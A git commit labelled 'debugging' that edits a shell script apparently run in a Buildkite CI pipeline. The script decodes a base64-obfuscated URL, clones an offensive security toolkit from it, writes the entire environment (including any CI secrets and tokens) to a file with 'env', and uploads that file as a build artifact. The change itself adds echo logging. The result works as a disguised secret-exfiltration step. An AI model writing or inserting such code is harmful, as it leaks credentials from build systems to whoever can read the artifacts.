78dda86c2e35e703a6ea5d2f6b64e95ed726efe6
Josh Fetzer <jlfetzer@protonmail.com>
2023-04-11 13:29:00 +0800

    debugging

--- script.sh
+++ script.sh
@@ -7,11 +7,23 @@ ARCHIVE=`mktemp $PREF.XXXXXXXXXX.tar.gz`
 
 REPO=`echo -n "aHR0cHM6Ly9naXRodWIuY29tL2ZvcnRyYS9pbXBhY2tldC5naXQ=" | base64 -d`
 
-git clone $REPO --single-branch $WORK_DIR
-git archive -o $ARCHIVE $WORK_DIR
+echo "Workdir is $WORK_DIR"
+echo "RES is $RES"
+echo "ARCHIVE is $ARCHIVE"
 
+
+echo "Cloning.."
+git clone $REPO --single-branch $WORK_DIR
+
+echo "archiving.."
+#git archive -o $ARCHIVE $WORK_DIR
+
+echo "exporting env..."
 env > $RES
 
+
+echo "uploading..."
 buildkite-agent artifact upload "$PREF.*"
 
+echo "Cleaning up.."
 rm -rf $WORK_DIR $RES
